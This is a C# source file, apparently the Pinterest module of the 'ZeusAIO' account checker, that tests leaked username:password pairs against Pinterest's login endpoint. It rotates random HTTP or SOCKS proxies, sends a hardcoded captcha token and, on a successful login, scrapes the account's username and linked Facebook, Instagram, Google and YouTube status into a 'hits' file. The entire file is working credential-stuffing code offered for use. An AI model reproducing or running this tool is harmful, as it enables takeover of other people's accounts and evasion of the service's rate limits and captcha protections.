using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using System.Security.Authentication;
using System.Net;
using checker;

namespace Pinterest
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                        Retry:
                        using (HttpRequest req = new HttpRequest())
                        {
                            StringBuilder capture = new StringBuilder();
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                req.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                req.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                req.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = false;
                            req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            req.AddHeader("origin", "https://www.pinterest.fr");
                            req.AddHeader("referer", "https://accounts.pinterest.com/");
                            req.AddHeader("sec-fetch-dest", "empty");
                            req.AddHeader("sec-fetch-mode", "cors");
                            req.AddHeader("sec-fetch-site", "cross-site");
                            req.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36");
                            req.AddHeader("x-pinterest-installid", "e6afc3356b99420298077fc6a98f6288");
                            req.AddHeader("Accept", "*/*");

                            var res0 = req.Post("https://accounts.pinterest.com/v3/login/handshake/", "username_or_email=" + s[0] + "&password=" + s[1] + "&&token=03AGdBq24_1f_klZwVOqB-_ypxfd6EZBmB_TFAjGz3C6-gYDWrTupUs2psutLWwxcTU1LGta3x1DPHuDnnN7o1TGe7i5-ytEz0T00CHzA6V7Octdccs5BwAJzDj2iSCLpL4F5CyezYLevzQQmRp1Dt_ZAX4hHPMNBnriY8Us-pvTIkuJORFs51xeEaj8vBhwgjFAjvWJ2cdTzAFYglIiFDeqooel-kg1aiTlDm_DwoL05hXip03d2-tHI3wJJQKHG1TM41yObvNZYUcNvpaVbmSa2UaHRFgPJa4F7m71JYNEwnMaJypjXVMVLBbt6jWR67vWVojiv28l0VuiT83ZgM2-WjQlVfGORnru6WDgWP1V6PD3IqIVJcPzxKuN4GqceKBgKn7AtHJYfO", "application/x-www-form-urlencoded");
                            string text0 = res0.ToString();

                            if (text0.Contains("{\"status\":\"success\",\""))
                            {
                                req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                                req.AddHeader("Pragma", "no-cache");
                                req.AddHeader("Accept", "*/*");

                                var res1 = req.Get("https://www.pinterest.ca/settings/account-settings");
                                string text1 = res1.ToString();

                                var USERNAME = Functions.LR(text1, "\":\"\",\"username\":\"", "\",\"").FirstOrDefault();
                                capture.Append(" | USERNAME = " + USERNAME);
                                var LINKEDWITHFACEBOOK = Functions.LR(text1, ",\"connected_to_facebook\":", ",\"").FirstOrDefault();
                                capture.Append(" | LINKED WITH FACEBOOK = " + LINKEDWITHFACEBOOK);
                                var LINKEDWITHINSTAGRAM = Functions.LR(text1, ",\"connected_to_instagram\":", ",\"connected_to_etsy\":").FirstOrDefault();
                                capture.Append(" | LINKED WITH INSTAGRAM = " + LINKEDWITHINSTAGRAM);
                                var CONNECTEDWITHGOOGLE = Functions.LR(text1, ",\"connected_to_google\":", ",\"").FirstOrDefault();
                                capture.Append(" | CONNECTED WITH GOOGLE = " + CONNECTEDWITHGOOGLE);
                                var LINKEDWITHYOUTUBE = Functions.LR(text1, ",\"connected_to_youtube\":", ",\"").FirstOrDefault();
                                capture.Append(" | LINKED WITH YOUTUBE = " + LINKEDWITHYOUTUBE);
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - Pinterest] - " + s[0] + ":" + s[1] + " | " + capture.ToString(), Color.Green);
                                }
                                Export.AsResult("/Pinterest_hits", s[0] + ":" + s[1] + " | " + capture.ToString());
                                ZeusAIO.mainmenu.hits++;
                                return false;
                            }
                            else if (text0.Contains("The password you entered is incorrect.") || text0.Contains("The email you entered does not belong to any account.") || text0.Contains("Hmm...that password isn't. right. We sent you an email to help you log in"))
                            {
                                break;
                            }
                            else
                            {
                                ZeusAIO.mainmenu.realretries++;
                                goto Retry;
                            }


                        }

                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
    }
}
                